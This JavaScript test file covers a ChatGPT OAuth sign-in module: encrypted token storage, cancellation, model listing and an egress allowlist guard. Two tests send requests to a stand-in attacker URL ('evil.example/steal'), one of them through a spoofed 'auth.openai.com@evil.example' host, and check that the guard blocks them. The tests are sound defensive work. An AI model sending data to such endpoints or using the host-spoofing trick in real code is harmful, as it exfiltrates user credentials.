import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createChatGPTConnection } from '../../bridge/byok/auth/chatgpt-connection.mjs';

const CLIENT = 'oaiapp_testclient123';
function encryption() {
  const key = crypto.randomBytes(32);
  return {
    isEncryptionAvailable: () => true,
    encryptString: value => {
      const iv = crypto.randomBytes(12);
      const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
      return Buffer.concat([iv, cipher.update(value), cipher.final(), cipher.getAuthTag()]);
    },
    decryptString: bytes => {
      const iv = bytes.subarray(0, 12);
      const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
      decipher.setAuthTag(bytes.subarray(-16));
      return Buffer.concat([decipher.update(bytes.subarray(12, -16)), decipher.final()]).toString('utf8');
    },
  };
}

async function fixture(fn, overrides = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nqa-chatgpt-connect-'));
  fs.chmodSync(root, 0o700);
  const visits = [];
  const exchangeCalls = [];
  const listeners = [];
  const secure = overrides.encryption ?? encryption();
  const callback = overrides.callback ?? { code: 'one-time-code', clientId: CLIENT };
  const startCallback = overrides.startCallback ? () => overrides.startCallback(listeners) : (async () => {
    const listener = {
      redirectUri: 'http://127.0.0.1:49123/auth/callback',
      waitForCallback: tx => { listener.transaction = tx; return Promise.resolve(callback); },
      cancel() { listener.cancelled = true; },
      close() { listener.closed = true; },
    };
    listeners.push(listener);
    return listener;
  });
  const openBrowser = overrides.openBrowser ?? (async uri => { visits.push(uri); });
  const exchangeCode = overrides.exchangeCode ?? (async args => {
    exchangeCalls.push(args);
    return {
      identity: { subject: 'stable-user', clientId: args.callback.clientId, email: 'private@example.org' },
      scopes: ['openid', 'resource.invoke', 'chatgpt.tokens.use.direct'],
      credentials: { accessToken: 'secret-access', refreshToken: 'secret-refresh', idToken: 'private-id-token', expiresAt: Date.now() + 3600_000 },
    };
  });
  const make = () => createChatGPTConnection({
    userData: root, encryption: secure, openBrowser,
    startCallback, exchangeCode,
    ...(overrides.withGuard ? {} : { fetchFn: overrides.fetchFn ?? (async () => { throw Error('unexpected remote request'); }) }),
  });
  try { return await fn({ root, make, listeners, visits, exchangeCalls, secure }); }
  finally { fs.rmSync(root, { recursive: true, force: true }); }
}

test('opens a pinned OpenAI sign-in URL and returns status, never credentials', () => fixture(async ({ root, make, visits, listeners }) => {
  const service = make();
  assert.deepEqual(service.status(), { ok: true, status: 'disconnected', sharing: false });
  const result = await service.signIn();
  assert.equal(result.ok, true);
  assert.equal(result.status, 'connected');
  assert.equal(result.sharing, true);
  assert.equal(result.clientId, CLIENT);
  assert.equal(result.subject, 'stable-user');
  assert.equal(visits.length, 1);
  assert.equal(new URL(visits[0]).origin, 'https://auth.openai.com');
  assert.equal(new URL(visits[0]).searchParams.get('client_id'), 'dynamic_agent_client');
  assert.ok(!JSON.stringify(result).includes('secret-access'));
  assert.equal(listeners[0].closed, true);
  assert.equal(await service.accessToken(), 'secret-access');
  const files = fs.readdirSync(path.join(root, 'chatgpt', 'credentials'));
  assert.deepEqual(files, ['client-' + CLIENT + '.bin']);
  assert.ok(!fs.readFileSync(path.join(root, 'chatgpt', 'credentials', files[0])).includes(Buffer.from('secret-access')));
}));

test('reconnect uses issued client identity and validates the same account', () => fixture(async ({ make, visits, exchangeCalls }) => {
  const first = make();
  assert.equal((await first.signIn()).ok, true);
  const afterRestart = make();
  assert.equal(afterRestart.status().status, 'connected');
  assert.equal((await afterRestart.signIn()).ok, true);
  assert.equal(new URL(visits[1]).searchParams.get('client_id'), CLIENT);
  assert.equal(exchangeCalls[1].expectedSubject, 'stable-user');
  assert.equal(await afterRestart.accessToken(), 'secret-access');
}));

test('disconnect removes credentials and returns disconnected status', () => fixture(async ({ make }) => {
  const service = make();
  await service.signIn();
  assert.deepEqual(service.disconnect(), { ok: true, status: 'disconnected', sharing: false });
  assert.deepEqual(service.status(), { ok: true, status: 'disconnected', sharing: false });
  await assert.rejects(service.accessToken(), /sign-in required/);
}));

test('refuses browser launch failures without activating credentials', () => fixture(async ({ make, listeners }) => {
  const service = make();
  assert.deepEqual(await service.signIn(), { ok: false, error: 'open_browser_failed' });
  assert.equal(listeners[0].cancelled, true);
  assert.equal(service.status().status, 'disconnected');
}, { openBrowser: async () => { throw Error('browser refused'); } }));

test('unavailable encryption blocks sign-in without falling back to plaintext', () => fixture(async ({ make }) => {
  const service = make();
  assert.deepEqual(service.status(), { ok: false, error: 'storage_unavailable' });
  assert.deepEqual(await service.signIn(), { ok: false, error: 'sign_in_failed' });
}, { encryption: { ...encryption(), isEncryptionAvailable: () => false } }));

test('refuses overlapping sign-ins and allows explicit cancellation', () => fixture(async ({ make, listeners }) => {
  const service = make();
  const first = service.signIn();
  // startCallback and openBrowser yield at microtask boundaries.
  await new Promise(resolve => setImmediate(resolve));
  assert.deepEqual(await service.signIn(), { ok: false, error: 'busy' });
  assert.deepEqual(service.cancelSignIn(), { ok: true });
  assert.equal(listeners[0].cancelled, true);
  assert.deepEqual(await first, { ok: false, error: 'sign_in_failed' });
}, { startCallback: async listeners => {
  let rejectWaiting;
  const listener = {
    redirectUri: 'http://127.0.0.1:49123/auth/callback',
    waitForCallback: () => new Promise((_, reject) => { rejectWaiting = reject; }),
    cancel() { listener.cancelled = true; rejectWaiting?.(new Error('cancelled')); },
    close() { listener.closed = true; },
  };
  listeners.push(listener);
  return listener;
} }));


test('model discovery is account-scoped and returns no secrets to the UI', () => fixture(async ({ make }) => {
  const service = make();
  assert.equal((await service.models()).error, 'sign_in_required');
  await service.signIn();
  const result = await service.models();
  assert.deepEqual(result, { ok: true, models: [{ id: 'gpt-test', name: 'GPT Test' }] });
  assert.ok(!JSON.stringify(result).includes('secret-access'));
  service.disconnect();
  assert.equal((await service.models()).error, 'sign_in_required');
}, {
  fetchFn: async (url, init) => {
    assert.equal(url, 'https://api.openai.com/v1/models');
    assert.equal(init.headers.authorization, 'Bearer secret-access');
    assert.equal(init.redirect, 'error');
    return new Response(JSON.stringify({ models: [
      { slug: 'gpt-test', display_name: 'GPT Test', visibility: 'list' },
    ] }), { headers: { 'content-type': 'application/json' } });
  },
}));


test('catalog format diagnostics reveal only a fixed reason, not remote response content', () => fixture(async ({ make }) => {
  const service = make();
  await service.signIn();
  const result = await service.models();
  assert.deepEqual(result, { ok: false, error: 'invalid_model_catalog', catalogReason: 'unexpected_shape' });
  assert.ok(!JSON.stringify(result).includes('private-catalog-response'));
  assert.ok(!JSON.stringify(result).includes('secret-access'));
}, {
  fetchFn: async () => new Response(JSON.stringify({
    object: 'list', data: [{ id: 'private-catalog-response' }],
  }), { status: 200, headers: { 'content-type': 'application/json' } }),
}));


test('production ChatGPT fetch fails closed until bound to shared guarded egress and after cleanup', async () => {
  await fixture(async ({ make }) => {
    const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
    const service = make();
    assert.equal((await service.signIn()).status, 'connected');
    assert.deepEqual(await service.models(), { ok: false, error: 'egress_blocked' });
    const allowedHosts = new Set();
    const calls = [];
    const guard = createEgress({
      allowHosts: () => allowedHosts,
      fetch: async (url) => {
        calls.push(url);
        return new Response(JSON.stringify({ models: [
          { slug: 'gpt-test', display_name: 'GPT Test', visibility: 'list' },
        ] }), { status: 200, headers: { 'content-type': 'application/json' } });
      },
    });
    const transport = {
      fetch: guard.fetch,
      stopped: guard.stopped,
      widen(hosts) {
        for (const host of hosts) allowedHosts.add(host);
        return () => { for (const host of hosts) allowedHosts.delete(host); };
      },
    };
    const detach = service.bindEgress(transport);
    assert.deepEqual((await service.models()).models, [{ id: 'gpt-test', name: 'GPT Test' }]);
    assert.deepEqual(calls, ['https://api.openai.com/v1/models']);
    assert.equal(guard.ledger()[0].host, 'api.openai.com');
    assert.equal(guard.ledger()[0].feature, 'unknown'); // the test guard uses a Set
    assert.equal(allowedHosts.size, 0, 'network access is scoped to each request');
    detach();
    assert.equal(allowedHosts.size, 0, 'temporary allowlist entries are released');
    const events = [];
    for await (const event of service.streamResponse({
      model: 'gpt-test', messages: [{ role: 'user', content: 'hello' }],
    })) events.push(event);
    assert.equal(events.at(-1).type, 'error');
    assert.equal(calls.length, 1, 'no network request can escape after detach');
    guard.uninstall();
    assert.throws(() => service.bindEgress(transport), /Active guarded egress required/);
  }, { withGuard: true });
});

test('guard refuses unrelated hosts even while ChatGPT is connected', async () => fixture(async ({ make }) => {
  const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
  const service = make();
  const hosts = new Map();
  const rawCalls = [];
  const g = createEgress({ allowHosts: () => hosts, fetch: async url => {
    rawCalls.push(url);
    return new Response('{}', { status: 200 });
  } });
  const release = service.bindEgress({
    fetch: g.fetch, stopped: g.stopped,
    widen(list, feature) {
      for (const host of list) hosts.set(host, feature);
      return () => { for (const host of list) hosts.delete(host); };
    },
  });
  await assert.rejects(g.fetch('https://evil.example/steal'),
    err => err.cause?.code === 'EGRESS_BLOCKED');
  assert.deepEqual(rawCalls, []);
  assert.deepEqual([...hosts], [], 'the allowlist is not widened at rest');
  assert.equal((await service.signIn()).status, 'connected');
  const remote = service.models();
  assert.equal((await remote).ok, false, 'dummy response is not a valid model catalog');
  assert.deepEqual(rawCalls, ['https://api.openai.com/v1/models']);
  assert.equal(hosts.size, 0, 'allowlist scopes end when requests complete');
  assert.equal(g.ledger().find(entry => entry.host === 'api.openai.com')?.feature, 'chatgpt');
  release();
  assert.equal(hosts.size, 0);
}, { withGuard: true }));


test('OAuth token exchange uses the guarded and origin-pinned transport, never a forged host', async () => {
  const called = [];
  const hosts = new Map();
  const { createEgress } = await import('../../bridge/byok/security/egress.mjs');
  const guard = createEgress({
    allowHosts: () => hosts,
    fetch: async (url) => {
      called.push(url);
      return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
    },
  });
  let spoofRejected = false;
  await fixture(async ({ make }) => {
    const service = make();
    const detach = service.bindEgress({
      fetch: guard.fetch,
      stopped: guard.stopped,
      widen: (allowed, feature) => {
        for (const host of allowed) hosts.set(host, feature);
        return () => { for (const host of allowed) hosts.delete(host); };
      },
    });
    const status = await service.signIn();
    assert.equal(status.ok, true);
    assert.equal(spoofRejected, true);
    assert.deepEqual(called, ['https://auth.openai.com/api/accounts/oauth/token']);
    assert.equal(guard.ledger().find(item => item.host === 'auth.openai.com').feature, 'chatgpt');
    assert.equal(hosts.size, 0, 'scoped allowance does not outlive exchange');
    detach();
  }, {
    withGuard: true,
    exchangeCode: async ({ callback, fetchFn }) => {
      await fetchFn('https://auth.openai.com/api/accounts/oauth/token', { method: 'POST', redirect: 'error' });
      try {
        await fetchFn('https://auth.openai.com@evil.example/steal', { method: 'POST' });
      } catch (e) {
        spoofRejected = e?.cause?.code === 'EGRESS_BLOCKED';
      }
      return {
        identity: { subject: 'stable-user', clientId: callback.clientId },
        scopes: ['openid', 'resource.invoke', 'chatgpt.tokens.use.direct'],
        credentials: { accessToken: 'secret-access', refreshToken: 'secret-refresh',
          idToken: 'private-id-token', expiresAt: Date.now() + 3600_000 },
      };
    },
  });
});
